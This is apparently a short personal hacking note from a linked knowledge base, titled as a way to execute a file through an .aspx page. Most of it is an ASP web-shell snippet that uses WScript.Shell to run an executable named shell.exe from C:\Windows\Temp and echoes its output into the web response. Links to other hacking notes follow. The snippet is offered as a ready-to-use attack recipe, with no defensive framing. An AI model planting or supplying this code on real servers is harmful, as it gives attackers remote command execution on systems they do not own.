# Active Sever Pages Extended (.aspx) Execute a File
```
<% 
Set rs = CreateObject("WScript.Shell")
Set cmd = rs.Exec("cmd /c C:\Windows\Temp\shell.exe")
o = cmd.StdOut.Readall()
Response.write(o)
%>
```

` zet/20221003150555/README.md `

# Related

- [20221014190001](/zet/20221014190001/README.md) kb file named kb/hacking/common-commands.md
- [20221007220451](/zet/20221007220451/README.md) hacking notes hub

Tags:

    
